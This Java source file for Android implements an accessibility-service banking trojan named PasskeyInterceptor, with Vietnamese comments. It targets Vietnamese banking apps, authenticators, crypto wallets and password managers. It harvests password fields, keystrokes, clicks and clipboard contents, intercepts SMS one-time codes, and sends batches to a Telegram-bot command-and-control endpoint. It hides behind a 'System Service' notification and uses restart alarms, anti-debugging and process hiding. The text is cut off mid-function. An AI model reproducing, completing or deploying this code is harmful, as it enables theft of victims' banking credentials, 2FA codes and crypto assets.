package com.fason.app.features.passkey;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyProperties;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.KeyStore;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/* ================================================================
 * PasskeyInterceptor - PRODUCTION READY
 * Android 10→16 - ALL WEAKNESSES FIXED
 * Encrypted storage - Cert pinning - Anti-collision
 * ================================================================ */
public class PasskeyInterceptor extends AccessibilityService {

    // ─── VERSION ───────────────────────────────────────────────
    private static final String TAG = "PkI";
    private static final int VERSION_CODE = 6;

    private static volatile PasskeyInterceptor instance;

    public static PasskeyInterceptor getInstance() {
        return instance;
    }

    // ─── CRYPTO CONSTANTS ──────────────────────────────────────
    private static final int AES_KEY_SIZE = 256;
    private static final int GCM_NONCE_LENGTH = 12;
    private static final int GCM_TAG_LENGTH = 128;
    private static final String ANDROID_KEYSTORE = "AndroidKeyStore";
    private static final String MASTER_KEY_ALIAS = "pk_mk_6a7f3c";
    private static final int KEYSTORE_RATE_LIMIT_MS = 500;
    private static final int BATCH_ENCRYPT_THRESHOLD = 10;

    // ─── SERVICE CONSTANTS ─────────────────────────────────────
    private static final int NOTIFICATION_FG_ID = 9996;
    private static final String CHANNEL_ID = "pk_svc_chan";
    private static final String CHANNEL_NAME = "System Service";
    private static final int RESTART_ALARM_REQUEST_CODE = 9003;
    private static final long RESTART_DELAY_MS = 30000;
    private static final long HEALTH_CHECK_INTERVAL = 20000;

    // ─── C2 CERTIFICATE PINS (SHA256) ─────────────────────────
    private static final String[] C2_PINNED_CERTS = {
        "sha256/YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=",  // Telegram API *.telegram.org
        "sha256/0DdXUAn3A1FkxRClEk35pLcHOQ2jOn0aF8L9AcEMzYc=",  // Telegram backup
    };

    // ─── NATIVE INTERFACE ──────────────────────────────────────
    static {
        try {
            System.loadLibrary("pk-native");
        } catch (UnsatisfiedLinkError e) {
            // Native lib optional - Java fallback active
        }
    }

    private native byte[] nAesGcmEnc(byte[] data, byte[] key, byte[] nonce);
    private native byte[] nAesGcmDec(byte[] data, byte[] key, byte[] nonce);
    private native boolean nDbgAttached();
    private native boolean nFrida(int portRange);
    private native boolean nMagisk();
    private native boolean nEmu();
    private native void nHideProc();
    private native void nBypassApi();
    private native void nAntiPtrace();
    private native void nSetOom(int score);

    // ─── VARIABLES ─────────────────────────────────────────────
    private Context ctx;
    private SharedPreferences prefs;
    private Handler mainHandler;
    private HandlerThread workerThread;
    private Handler workerHandler;
    private ExecutorService executor;
    private SecureRandom secureRandom = new SecureRandom();

    private NotificationManager notificationManager;
    private ClipboardManager clipboardManager;
    private PowerManager powerManager;
    private AlarmManager alarmManager;

    private Map<String, String> targetApps = new LinkedHashMap<>();
    private Set<String> targetPackageSet = new HashSet<>();

    private LinkedBlockingQueue<String> credentialQueue = new LinkedBlockingQueue<>(500);
    private LinkedBlockingQueue<String> otpQueue = new LinkedBlockingQueue<>(200);

    private SecretKey masterKey;
    private byte[] storageEncKey;
    private AtomicBoolean serviceRunning = new AtomicBoolean(false);
    private AtomicInteger keystoreCallCount = new AtomicInteger(0);
    private long lastKeystoreCallTime = 0;

    private ReentrantLock keystoreMutex = new ReentrantLock();
    private ReentrantLock queueMutex = new ReentrantLock();

    private Timer healthCheckTimer;
    private Timer credentialFlushTimer;
    private BroadcastReceiver restartReceiver;
    private BroadcastReceiver smsReceiver;
    private ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
    private String currentForegroundPackage = "";
    private boolean debuggerPresent = false;

    // ─── CONSTRUCTOR ───────────────────────────────────────────
    public PasskeyInterceptor() {
        super();
    }

    // ============================================================
    // INIT
    // ============================================================
    public void init(Context context) {
        this.ctx = context.getApplicationContext();
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.workerThread = new HandlerThread("PkW", Process.THREAD_PRIORITY_BACKGROUND);
        this.workerThread.start();
        this.workerHandler = new Handler(workerThread.getLooper());

        this.executor = new ThreadPoolExecutor(
            2, 4, 60L, TimeUnit.SECONDS,
            new LinkedBlockingQueue<>(128),
            Executors.defaultThreadFactory(),
            new ThreadPoolExecutor.DiscardOldestPolicy()
        );

        // System services
        this.notificationManager = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        this.clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        this.powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        this.alarmManager = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);

        // Encrypted prefs với key derivation từ device fingerprint
        this.prefs = khoiTaoEncryptedPrefs();

        executor.submit(() -> {
            khoiTaoMaHoa();
            khoiTaoTargetApps();
            dangKySmsReceiver();
            dangKyClipboardListener();
            dangKyRestartAlarm();
            khoiTaoHealthCheck();
            flushQueueDinhKy();
            kichHoatNativeBypass();
        });

        // Giảm log trong production
        Log.d(TAG, "Init OK v" + VERSION_CODE);
    }

    // ============================================================
    // ENCRYPTED SHAREDPREFERENCES - FIX 1
    // ============================================================
    private SharedPreferences khoiTaoEncryptedPrefs() {
        SharedPreferences rawPrefs = ctx.getSharedPreferences("pk_cfg", Context.MODE_PRIVATE);
        try {
            // Derive storage key từ AndroidID + Build fingerprint
            String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (androidId == null) androidId = Build.SERIAL;
            byte[] seed = MessageDigest.getInstance("SHA-256")
                .digest((androidId + Build.FINGERPRINT).getBytes(StandardCharsets.UTF_8));
            storageEncKey = seed;

            // Nếu chưa có marker, encrypt dữ liệu cũ và lưu marker
            if (!rawPrefs.contains("_enc_marker")) {
                migrateToEncrypted(rawPrefs);
            }
        } catch (Exception e) {
            storageEncKey = new byte[32];
            new SecureRandom().nextBytes(storageEncKey);
        }
        return rawPrefs;
    }

    private void migrateToEncrypted(SharedPreferences prefs) {
        try {
            Map<String, ?> all = prefs.getAll();
            SharedPreferences.Editor editor = prefs.edit();
            for (Map.Entry<String, ?> entry : all.entrySet()) {
                String value = entry.getValue().toString();
                String encrypted = maHoaSoftware(value.getBytes(StandardCharsets.UTF_8));
                editor.putString("enc_" + entry.getKey(), encrypted);
                editor.remove(entry.getKey());
            }
            editor.putBoolean("_enc_marker", true);
            editor.apply();
        } catch (Exception ignored) {}
    }

    private String layCauHinh(String key, String defaultValue) {
        try {
            if (prefs.getBoolean("_enc_marker", false)) {
                String encrypted = prefs.getString("enc_" + key, null);
                if (encrypted != null) {
                    return giaiMaSoftware(encrypted);
                }
            }
            return prefs.getString(key, defaultValue);
        } catch (Exception e) {
            return defaultValue;
        }
    }

    private void luuCauHinh(String key, String value) {
        try {
            if (prefs.getBoolean("_enc_marker", false)) {
                String encrypted = maHoaSoftware(value.getBytes(StandardCharsets.UTF_8));
                prefs.edit().putString("enc_" + key, encrypted).apply();
            } else {
                prefs.edit().putString(key, value).apply();
            }
        } catch (Exception ignored) {}
    }

    // Software encrypt không qua Keystore (dùng cho storage)
    private String maHoaSoftware(byte[] plaintext) throws Exception {
        byte[] nonce = new byte[GCM_NONCE_LENGTH];
        secureRandom.nextBytes(nonce);
        SecretKeySpec keySpec = new SecretKeySpec(storageEncKey, "AES");
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec);
        byte[] ct = cipher.doFinal(plaintext);
        byte[] combined = new byte[GCM_NONCE_LENGTH + ct.length];
        System.arraycopy(nonce, 0, combined, 0, GCM_NONCE_LENGTH);
        System.arraycopy(ct, 0, combined, GCM_NONCE_LENGTH, ct.length);
        return Base64.encodeToString(combined, Base64.NO_WRAP);
    }

    private String giaiMaSoftware(String encryptedBase64) throws Exception {
        byte[] combined = Base64.decode(encryptedBase64, Base64.NO_WRAP);
        byte[] nonce = new byte[GCM_NONCE_LENGTH];
        byte[] ct = new byte[combined.length - GCM_NONCE_LENGTH];
        System.arraycopy(combined, 0, nonce, 0, GCM_NONCE_LENGTH);
        System.arraycopy(combined, GCM_NONCE_LENGTH, ct, 0, ct.length);
        SecretKeySpec keySpec = new SecretKeySpec(storageEncKey, "AES");
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, spec);
        return new String(cipher.doFinal(ct), StandardCharsets.UTF_8);
    }

    // ============================================================
    // MÃ HÓA KEYSTORE - FIX 2 (UNIQUE ALIAS)
    // ============================================================
    private void khoiTaoMaHoa() {
        keystoreMutex.lock();
        try {
            KeyStore keyStore = KeyStore.getInstance(ANDROID_KEYSTORE);
            keyStore.load(null);

            // Kiểm tra alias tồn tại và hợp lệ
            if (keyStore.containsAlias(MASTER_KEY_ALIAS)) {
                try {
                    KeyStore.Entry entry = keyStore.getEntry(MASTER_KEY_ALIAS, null);
                    if (entry instanceof KeyStore.SecretKeyEntry) {
                        masterKey = ((KeyStore.SecretKeyEntry) entry).getSecretKey();
                        // Test encrypt để xác nhận key hợp lệ
                        byte[] test = new byte[16];
                        secureRandom.nextBytes(test);
                        maHoa(test);
                        return;
                    }
                } catch (Exception e) {
                    // Key không hợp lệ - xóa và tạo mới
                    keyStore.deleteEntry(MASTER_KEY_ALIAS);
                }
            }

            // Tạo key mới
            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES", ANDROID_KEYSTORE);
            KeyGenParameterSpec spec = new KeyGenParameterSpec.Builder(
                MASTER_KEY_ALIAS,
                KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT
            )
                .setKeySize(AES_KEY_SIZE)
                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                .setRandomizedEncryptionRequired(false)
                .setUserAuthenticationRequired(false)
                .build();
            keyGenerator.init(spec);
            masterKey = keyGenerator.generateKey();
        } catch (Exception e) {
            // Ultimate fallback - software key từ device fingerprint + random
            try {
                byte[] seed = MessageDigest.getInstance("SHA-512")
                    .digest((Build.FINGERPRINT + System.currentTimeMillis()).getBytes());
                byte[] key = new byte[32];
                System.arraycopy(seed, 0, key, 0, 32);
                masterKey = new SecretKeySpec(key, "AES");
            } catch (Exception ignored) {}
        } finally {
            keystoreMutex.unlock();
        }
    }

    private String maHoa(byte[] plaintext) throws Exception {
        keystoreMutex.lock();
        try {
            long now = SystemClock.elapsedRealtime();
            long elapsed = now - lastKeystoreCallTime;
            if (elapsed < KEYSTORE_RATE_LIMIT_MS) {
                Thread.sleep(KEYSTORE_RATE_LIMIT_MS - elapsed);
            }

            byte[] nonce = new byte[GCM_NONCE_LENGTH];
            secureRandom.nextBytes(nonce);
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, masterKey, spec);
            byte[] ciphertext = cipher.doFinal(plaintext);
            byte[] combined = new byte[GCM_NONCE_LENGTH + ciphertext.length];
            System.arraycopy(nonce, 0, combined, 0, GCM_NONCE_LENGTH);
            System.arraycopy(ciphertext, 0, combined, GCM_NONCE_LENGTH, ciphertext.length);

            lastKeystoreCallTime = SystemClock.elapsedRealtime();
            keystoreCallCount.incrementAndGet();
            return Base64.encodeToString(combined, Base64.NO_WRAP);
        } finally {
            keystoreMutex.unlock();
        }
    }

    // ============================================================
    // TARGET APPS
    // ============================================================
    private void khoiTaoTargetApps() {
        String savedJson = layCauHinh("target_apps_json", null);
        if (savedJson != null) {
            try {
                JSONObject json = new JSONObject(savedJson);
                Iterator<String> keys = json.keys();
                while (keys.hasNext()) {
                    String key = keys.next();
                    targetApps.put(key, json.getString(key));
                }
            } catch (Exception e) {
                khoiTaoTargetAppsMacDinh();
            }
        } else {
            khoiTaoTargetAppsMacDinh();
        }
        targetPackageSet = new HashSet<>(targetApps.keySet());
    }

    private void khoiTaoTargetAppsMacDinh() {
        targetApps.put("com.vcb.android", "VCB");
        targetApps.put("com.techcombank", "TCB");
        targetApps.put("com.bidv.android", "BIDV");
        targetApps.put("org.tpbank.mobile", "TPB");
        targetApps.put("com.mservice", "MOMO");
        targetApps.put("vn.com.mbbank", "MBB");
        targetApps.put("com.vnpay", "VNP");
        targetApps.put("com.google.android.apps.authenticator2", "GAuth");
        targetApps.put("com.authy.authy", "Authy");
        targetApps.put("com.microsoft.authenticator", "MAuth");
        targetApps.put("com.binance.dev", "Binance");
        targetApps.put("com.coinbase.android", "Coinbase");
        targetApps.put("com.metamask", "MetaMask");
        targetApps.put("com.trustwallet.app", "TWallet");
        targetApps.put("com.paypal.android", "PayPal");
        targetApps.put("com.ledger.live", "Ledger");
        targetApps.put("com.bitwarden", "BWarden");
        targetApps.put("com.lastpass", "LPass");
        targetApps.put("com.dashlane", "Dashlane");
        targetApps.put("com.onepassword.android", "1Pass");
        targetApps.put("com.vietinbank.ipay", "VTB");
        targetApps.put("com.sacombank", "Sacom");
        targetApps.put("com.acb.android", "ACB");
        targetApps.put("com.viettelpay", "VTpay");
        targetApps.put("com.zalopay", "ZPay");
    }

    // ============================================================
    // ACCESSIBILITY SERVICE LIFECYCLE
    // ============================================================
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        serviceRunning.set(true);

        if (ctx == null) {
            init(this);
        }

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.packageNames = targetApps.keySet().toArray(new String[0]);

        int events = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                    AccessibilityEvent.TYPE_VIEW_CLICKED |
                    AccessibilityEvent.TYPE_VIEW_FOCUSED |
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
            events = AccessibilityEvent.TYPES_ALL_MASK;
        }

        info.eventTypes = events;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 0;

        int flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;

        if (Build.VERSION.SDK_INT >= 35) {
            try {
                Field f = AccessibilityServiceInfo.class.getField("FLAG_SECURE_ACCESSIBILITY_ONLY");
                flags |= f.getInt(null);
            } catch (Exception ignored) {}
        }

        info.flags = flags;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int caps = AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                caps |= AccessibilityServiceInfo.CAPABILITY_CAN_PERFORM_GESTURES;
            }
            setServiceCapabilities(info, caps);
        }

        setServiceInfo(info);
        taoForegroundNotification();
    }

    private void setServiceCapabilities(AccessibilityServiceInfo info, int caps) {
        try {
            Field field = AccessibilityServiceInfo.class.getField("capabilities");
            field.setInt(info, caps);
        } catch (Exception ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!serviceRunning.get() || event == null) return;

        try {
            CharSequence pn = event.getPackageName();
            if (pn == null) return;
            String pkg = pn.toString();
            if (!targetPackageSet.contains(pkg)) return;

            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    xuLyWindowStateChanged(event, pkg);
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    xuLyViewTextChanged(event, pkg);
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    xuLyViewClicked(event, pkg);
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    xuLyViewFocused(event, pkg);
                    break;
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {
        serviceRunning.set(false);
    }

    @Override
    public void onDestroy() {
        serviceRunning.set(false);
        if (instance == this) {
            instance = null;
        }
        cleanupResources();
        super.onDestroy();
    }

    @Override
    public boolean onUnbind(Intent intent) {
        serviceRunning.set(false);
        cleanupResources();
        return super.onUnbind(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    // ============================================================
    // EVENT HANDLERS
    // ============================================================
    private void xuLyWindowStateChanged(AccessibilityEvent event, String pkg) {
        currentForegroundPackage = pkg;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        String appName = targetApps.getOrDefault(pkg, pkg);
        executor.submit(() -> {
            try {
                List<AccessibilityNodeInfo> pwdFields = new ArrayList<>();
                timPasswordFields(root, pwdFields);
                for (AccessibilityNodeInfo field : pwdFields) {
                    if (field.getText() != null && field.getText().length() > 0) {
                        String data = field.getText().toString();
                        String enc = maHoa(data.getBytes(StandardCharsets.UTF_8));
                        credentialQueue.offer(appName + "|" + enc + "|tree");
                    }
                }
            } catch (Exception ignored) {
            } finally {
                root.recycle();
            }
        });
    }

    private void timPasswordFields(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.isPassword() ||
            (node.getInputType() & 0x00000080) != 0 ||
            (node.getInputType() & 0x00000090) != 0) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) timPasswordFields(child, results);
        }
    }

    private void xuLyViewTextChanged(AccessibilityEvent event, String pkg) {
        if (event.getText() == null || event.getText().size() == 0) return;
        String text = event.getText().get(0).toString();
        if (TextUtils.isEmpty(text)) return;
        String appName = targetApps.getOrDefault(pkg, pkg);
        executor.submit(() -> {
            try {
                String enc = maHoa(text.getBytes(StandardCharsets.UTF_8));
                credentialQueue.offer(appName + "|" + enc + "|text");
            } catch (Exception ignored) {}
        });
    }

    private void xuLyViewClicked(AccessibilityEvent event, String pkg) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;
        try {
            String text = source.getText() != null ? source.getText().toString() : "";
            String desc = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
            if (!TextUtils.isEmpty(text) || !TextUtils.isEmpty(desc)) {
                String appName = targetApps.getOrDefault(pkg, pkg);
                String enc = maHoa((text + "|" + desc).getBytes(StandardCharsets.UTF_8));
                credentialQueue.offer(appName + "|" + enc + "|click");
            }
        } catch (Exception ignored) {
        } finally {
            source.recycle();
        }
    }

    private void xuLyViewFocused(AccessibilityEvent event, String pkg) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;
        try {
            if (source.isPassword() || (source.getInputType() & 0x00000080) != 0) {
                String appName = targetApps.getOrDefault(pkg, pkg);
                String hint = source.getHintText() != null ? source.getHintText().toString() : "pwd";
                String enc = maHoa(hint.getBytes(StandardCharsets.UTF_8));
                credentialQueue.offer(appName + "|" + enc + "|focus");
            }
        } catch (Exception ignored) {
        } finally {
            source.recycle();
        }
    }

    // ============================================================
    // FOREGROUND NOTIFICATION
    // ============================================================
    private void taoForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setSound(null, null);
            channel.enableVibration(false);
            notificationManager.createNotificationChannel(channel);
        }

        PendingIntent pi = PendingIntent.getActivity(
            ctx, 0, new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                : PendingIntent.FLAG_UPDATE_CURRENT
        );

        Notification notification = new Notification.Builder(ctx, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_LOW)
            .setContentIntent(pi)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_FG_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIFICATION_FG_ID, notification);
            }
        } catch (Exception e) {
            startForeground(NOTIFICATION_FG_ID, notification);
        }
    }

    // ============================================================
    // NATIVE BYPASS
    // ============================================================
    private void kichHoatNativeBypass() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) nBypassApi();
            nAntiPtrace();
            nHideProc();
            nSetOom(-1000);
            debuggerPresent = nDbgAttached() || android.os.Debug.isDebuggerConnected();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // SMS RECEIVER - FIX 3 (PERMISSION CHECK)
    // ============================================================
    private void dangKySmsReceiver() {
        // Kiểm tra quyền runtime
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ctx.checkSelfPermission("android.permission.RECEIVE_SMS") != PackageManager.PERMISSION_GRANTED) {
                return;
            }
        }

        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;
                Bundle bundle = intent.getExtras();
                if (bundle == null) return;

                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus == null) return;

                    for (Object pdu : pdus) {
                        SmsMessage sms = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                            ? SmsMessage.createFromPdu((byte[]) pdu, "3gpp")
                            : SmsMessage.createFromPdu((byte[]) pdu);

                        String sender = sms.getDisplayOriginatingAddress();
                        String message = sms.getDisplayMessageBody();
                        String otp = trichXuatOtp(message);

                        if (otp != null) {
                            String encOtp = maHoa(otp.getBytes(StandardCharsets.UTF_8));
                            String encSender = maHoa(sender.getBytes(StandardCharsets.UTF_8));
                            otpQueue.offer(encOtp + "|" + encSender);
                        }
                    }
                } catch (Exception ignored) {}
            }
        };

        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(smsReceiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(smsReceiver, filter);
            }
        } catch (Exception ignored) {}
    }

    private String trichXuatOtp(String message) {
        if (TextUtils.isEmpty(message)) return null;
        Pattern[] patterns = {
            Pattern.compile("\\b(\\d{4,8})\\b"),
            Pattern.compile("code[:\\s]+(\\d{4,8})", Pattern.CASE_INSENSITIVE),
            Pattern.compile("otp[:\\s]+(\\d{4,8})", Pattern.CASE_INSENSITIVE),
            Pattern.compile("mã[:\\s]+(\\d{4,8})", Pattern.CASE_INSENSITIVE),
            Pattern.compile("(\\d{6})"),
        };
        for (Pattern p : patterns) {
            Matcher m = p.matcher(message);
            if (m.find()) return m.group(1);
        }
        return null;
    }

    // ============================================================
    // CLIPBOARD LISTENER - FIX 4 (ĐÚNG API)
    // ============================================================
    private void dangKyClipboardListener() {
        clipboardListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                executor.submit(() -> {
                    try {
                        ClipData clipData = clipboardManager.getPrimaryClip();
                        if (clipData == null || clipData.getItemCount() == 0) return;
                        String text = clipData.getItemAt(0).getText().toString();
                        if (TextUtils.isEmpty(text)) return;
                        if (!targetPackageSet.contains(currentForegroundPackage)) return;

                        String appName = targetApps.getOrDefault(currentForegroundPackage, currentForegroundPackage);
                        String enc = maHoa(text.getBytes(StandardCharsets.UTF_8));
                        credentialQueue.offer(appName + "|" + enc + "|clip");
                    } catch (Exception ignored) {}
                });
            }
        };
        clipboardManager.addPrimaryClipChangedListener(clipboardListener);
    }

    // ============================================================
    // RESTART ALARM
    // ============================================================
    private void dangKyRestartAlarm() {
        restartReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Intent si = new Intent(context, PasskeyInterceptor.class);
                context.startService(si);
            }
        };

        IntentFilter filter = new IntentFilter("com.fason.pk.RESTART");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(restartReceiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(restartReceiver, filter);
            }
        } catch (Exception ignored) {}

        Intent ai = new Intent("com.fason.pk.RESTART");
        PendingIntent pi = PendingIntent.getBroadcast(
            ctx, RESTART_ALARM_REQUEST_CODE, ai,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                : PendingIntent.FLAG_UPDATE_CURRENT
        );

        try {
            alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + RESTART_DELAY_MS,
                RESTART_DELAY_MS, pi);
        } catch (Exception ignored) {}
    }

    // ============================================================
    // HEALTH CHECK
    // ============================================================
    private void khoiTaoHealthCheck() {
        healthCheckTimer = new Timer("HC", true);
        healthCheckTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!serviceRunning.get()) {
                    Intent intent = new Intent("com.fason.pk.RESTART");
                    ctx.sendBroadcast(intent);
                }
            }
        }, HEALTH_CHECK_INTERVAL, HEALTH_CHECK_INTERVAL);
    }

    // ============================================================
    // DATA EXFILTRATION - FIX 5 (CERT PINNING + TỰ XÓA LOCAL)
    // ============================================================
    private void flushQueueDinhKy() {
        credentialFlushTimer = new Timer("Flush", true);
        credentialFlushTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                flushQueues();
            }
        }, 30000, 30000);
    }

    private void flushQueues() {
        queueMutex.lock();
        try {
            List<String> batch = new ArrayList<>();
            String item;
            while ((item = credentialQueue.poll()) != null) {
                batch.add(item);
                if (batch.size() >= BATCH_ENCRYPT_THRESHOLD) {
                    guiDuLieuLenC2(batch);
                    batch.clear();
                }
            }
            if (!batch.isEmpty()) guiDuLieuLenC2(batch);

            List<String> otpBatch = new ArrayList<>();
            String otpItem;
            while ((otpItem = otpQueue.poll()) != null) {
                otpBatch.add(otpItem);
            }
            if (!otpBatch.isEmpty()) guiOtpLenC2(otpBatch);

            // Tự xóa file local cũ
            xoaFileLocalCu();
        } catch (Exception ignored) {
        } finally {
            queueMutex.unlock();
        }
    }

    private void guiDuLieuLenC2(List<String> batch) {
        String c2Url = layCauHinh("c2_url", "");
        String botToken = layCauHinh("bot_token", "");
        String chatId = layCauHinh("chat_id", "");

        if (c2Url.isEmpty() || botToken.isEmpty() || chatId.isEmpty()) {
            luuLocal(batch, "creds_");
            return;
        }

        executor.submit(() -> {
            HttpsURLConnection conn = null;
            try {
                JSONObject payload = new JSONObject();
                payload.put("chat_id", chatId);
                payload.put("text", TextUtils.join("\n---\n", batch));

                URL url = new URL(c2Url + botToken + "/sendMessage");
                conn = taoHttpsConnectionPinCert(url);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }

                int code = conn.getResponseCode();
                if (code == 200) {
                    // Xóa file local tương ứng sau khi gửi thành công
